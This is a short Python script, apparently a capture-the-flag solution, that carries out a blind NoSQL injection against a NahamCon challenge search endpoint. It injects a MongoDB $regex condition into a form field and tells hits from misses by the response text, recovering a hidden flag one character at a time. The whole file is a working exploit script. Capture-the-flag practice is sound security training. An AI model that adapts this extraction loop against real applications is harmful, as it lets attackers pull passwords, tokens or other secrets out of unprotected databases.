import requests
import string
import urllib3

urllib3.disable_warnings()  # Disable SSL warnings for self-signed certs

URL = "http://challenge.nahamcon.com:32513/search"
CHARSET = "0123456789abcdef"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": URL,
    "Referer": URL,
    "User-Agent": "Mozilla/5.0",
}
PREFIX = "flag{"
MAX_LEN = 32  # characters inside the flag braces
MATCH_STRING = "Pattern matched"


def try_prefix(prefix):
    query = {"query": f'flag: {{"$regex": "^{prefix}"}}', "collection": "flags"}
    response = requests.post(URL, data=query, headers=HEADERS, verify=False)
    return MATCH_STRING in response.text


def brute_force_flag():
    known = PREFIX
    while len(known) < len(PREFIX) + MAX_LEN:
        for char in CHARSET:
            attempt = known + char
            print(f"[*] Trying: {attempt}")
            if try_prefix(attempt):
                known += char
                print(f"[+] Matched: {known}")
                break
        else:
            print("[!] No matching character found. Exiting.")
            break

    final_flag = known + "}"
    print(f"[🏁] Final flag: {final_flag}")


if __name__ == "__main__":
    brute_force_flag()
